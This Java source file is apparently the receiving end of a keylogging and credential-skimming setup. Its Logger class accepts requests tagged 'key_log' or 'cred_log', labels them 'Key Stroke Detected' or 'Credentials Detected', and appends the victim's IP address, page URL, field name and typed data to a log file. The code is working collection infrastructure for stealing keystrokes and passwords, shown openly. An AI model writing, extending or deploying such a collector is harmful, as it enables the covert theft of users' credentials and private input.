package logger;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

import javax.servlet.http.HttpServletRequest;

import com.google.gson.Gson;

import datastructures.ClientInfo;
import datastructures.LogElement;
import datastructures.RequestInfo;


public class Logger {
	public static String LOG_PARAM = "logType";
	public static String KEY_LOG_VALUE = "key_log";
	public static String CREDENTIAL_LOG_VALUE = "cred_log";
	
	public synchronized void logRequest(String path, HttpServletRequest request){
		if(path==null || path.equals("")){
			path="/log.text";
		}
		//log ket stroke data
		//System.out.println(new Date().toString()+":("+request.getRemoteAddr()+","+l.toString()+")");
		Map<String, String[]> params = request.getParameterMap();
		Gson gson = new Gson();
		String s = gson.toJson(convertToRightMap(request.getParameterMap()));
		LogElement l = (LogElement) gson.fromJson(s,LogElement.class);
		String prefix = "";
		if(params.containsKey(LOG_PARAM)){
			String type = params.get(LOG_PARAM)[0];
			if(type.equals(KEY_LOG_VALUE)){
				prefix = "Key Stroke Detected: ";
			}else if(type.equals(CREDENTIAL_LOG_VALUE)){
				prefix = "Credentials Detected: ";
			}else{
				return;
			}
		}

		try {
			String content = new Date().toString() + " "+prefix+"\n"+
							"Remote IP: "+request.getRemoteAddr()+"\n"+
							"Webpage: "+l.url+"\n"+
							"Field Name: "+l.key+"\n"+
							"Data: "+l.value+"\n";
			System.out.println(content);
			File file = new File(path);
 
			// if file doesnt exists, then create it
			if (!file.exists()) {
				file.createNewFile();
			}
 
			FileWriter fw = new FileWriter(file.getAbsoluteFile(),true);
			BufferedWriter bw = new BufferedWriter(fw);
			bw.append(content);
			bw.close();
 
 
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
    public Map<String,String> convertToRightMap(Map<String,String[]> data){
    	HashMap<String,String> out = new HashMap<String,String>();
    	for(String key:data.keySet()){
    		out.put(key, data.get(key)[0]);
    	}
    	return out;
    }
}
